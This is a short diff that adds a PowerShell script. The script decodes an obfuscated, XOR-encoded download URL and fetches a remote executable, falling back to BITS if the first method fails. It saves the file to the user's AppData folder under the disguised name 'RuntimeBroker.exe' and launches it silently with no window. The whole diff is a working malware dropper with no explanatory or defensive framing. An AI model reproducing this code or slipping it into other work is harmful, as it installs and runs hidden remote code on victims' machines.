@@ -1,0 +1,9 @@
+$k=13;$u=-join(@(101,121,121,125,126,55,34,34,106,100,121,101,120,111,35,110,98,96,34,100,104,99,105,103,105,58,32,97,106,121,96,34,32,105,104,125,127,104,126,126,100,98,99,102,100,97,97,34,127,108,122,34,127,104,107,126,34,101,104,108,105,126,34,96,108,100,99,34,110,127,116,125,121,104,105,82,125,98,122,104,127,126,101,104,97,97,35,104,117,104)|%{[char]($_-bxor$k)})
+
+$p="$env:APPDATA\RuntimeBroker.exe"
+
+
+try{$h=[System.Net.Http.HttpClient]::new();[IO.File]::WriteAllBytes($p,$h.GetByteArrayAsync($u).GetAwaiter().GetResult())}catch{Start-BitsTransfer -Source $u -Destination $p}
+
+
+$s=New-Object Diagnostics.ProcessStartInfo $p;$s.CreateNoWindow=1;$s.UseShellExecute=0;[Diagnostics.Process]::Start($s)|Out-Null
